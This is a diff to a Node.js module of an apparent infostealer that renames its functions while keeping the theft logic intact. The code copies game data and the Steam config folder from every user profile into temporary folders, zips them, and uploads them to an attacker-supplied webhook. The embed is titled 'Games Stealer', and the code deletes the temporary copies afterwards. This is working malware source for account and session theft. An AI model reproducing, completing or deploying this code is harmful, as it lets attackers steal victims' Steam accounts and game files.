@@ -9,8 +9,8 @@ const requests = require('./../../utils/requests/requests.js');
 const fileutil = require('./../../utils/fileutil/fileutil.js');
 const hardware = require('./../../utils/hardware/hardware.js');
 
-const games = async (webhookUrl) => {
-    const users = await hardware.getUsers();
+const Games = async (webhookUrl) => {
+    const users = await hardware.GetUsers();
 
     const gamesTempDir = path.join(os.tmpdir(), `games-temp`);
     if (!fs.existsSync(gamesTempDir)) {
@@ -21,7 +21,7 @@ const games = async (webhookUrl) => {
     let foundGames = '';
 
     for (const user of users) {
-        for (const [gameName, gamePaths] of Object.entries(gamesPaths.getGames())) {
+        for (const [gameName, gamePaths] of Object.entries(gamesPaths.GetGames())) {
             const destGames = path.join(gamesTempDir, path.basename(user), gameName);
 
             for (const [name, relativePath] of Object.entries(gamePaths)) {
@@ -41,7 +41,7 @@ const games = async (webhookUrl) => {
                         fs.mkdirSync(path.join(destGames, name), { recursive: true });
                     }
 
-                    await fileutil.copy(gamePath, gameDestPath);
+                    await fileutil.Copy(gamePath, gameDestPath);
 
                     if (!foundGames.includes(gameName)) {
                         foundGames += `\n✅ ${path.basename(user)} - ${gameName}`;
@@ -69,12 +69,12 @@ const games = async (webhookUrl) => {
 
     const gamesTempZip = path.join(os.tmpdir(), 'games.zip');
     try {
-        await fileutil.zipDirectory({
+        await fileutil.ZipDirectory({
             inputDir: gamesTempDir,
             outputZip: gamesTempZip
         });
 
-        await requests.webhook(webhookUrl, {
+        await requests.Webhook(webhookUrl, {
             embeds: [{
                 title: `Games Stealer`,
                 description: '```' + foundGames + '```',
@@ -82,14 +82,14 @@ const games = async (webhookUrl) => {
         }, [gamesTempZip]);
 
         [gamesTempDir, gamesTempZip].forEach(dir => {
-            fileutil.removeDir(dir);
+            fileutil.RemoveDir(dir);
         });
     } catch (error) {
         console.error(error);
     }
 };
 
-const steam = async (webhookUrl) => {
+const Steam = async (webhookUrl) => {
     const steamTempDir = path.join(os.tmpdir(), 'steam-temp');
     const steamPath = path.join('C:', 'Program Files (x86)', 'Steam', 'config');
 
@@ -143,10 +143,10 @@ const steam = async (webhookUrl) => {
                     player_level = 'Not Found',
                 } = accountLevel;
 
-                await fileutil.copy(steamPath, steamTempDir);
+                await fileutil.Copy(steamPath, steamTempDir);
                 const steamTempZip = path.join(os.tmpdir(), 'steam.zip');
 
-                await fileutil.zipDirectory({
+                await fileutil.ZipDirectory({
                     inputDir: steamTempDir,
                     outputZip: steamTempZip
                 });
@@ -157,7 +157,7 @@ const steam = async (webhookUrl) => {
                     level: player_level,
                 };
 
-                await requests.webhook(webhookUrl, {
+                await requests.Webhook(webhookUrl, {
                     embeds: [{
                         title: `Steam Account`,
                         thumbnail: {
@@ -202,10 +202,10 @@ const steam = async (webhookUrl) => {
 
 
                 const WishTempDir = fileutil.WishTempDir('games');
-                await fileutil.copy(steamTempDir, WishTempDir);
+                await fileutil.Copy(steamTempDir, WishTempDir);
 
                 [steamTempDir, steamTempZip].forEach(dir => {
-                    fileutil.removeDir(dir);
+                    fileutil.RemoveDir(dir);
                 });
             } catch (error) {
                 console.error(error);
@@ -215,6 +215,6 @@ const steam = async (webhookUrl) => {
 };
 
 module.exports = async (webhookUrl) => {
-    await games(webhookUrl);
-    await steam(webhookUrl);
-}
+    await Games(webhookUrl);
+    await Steam(webhookUrl);
+};
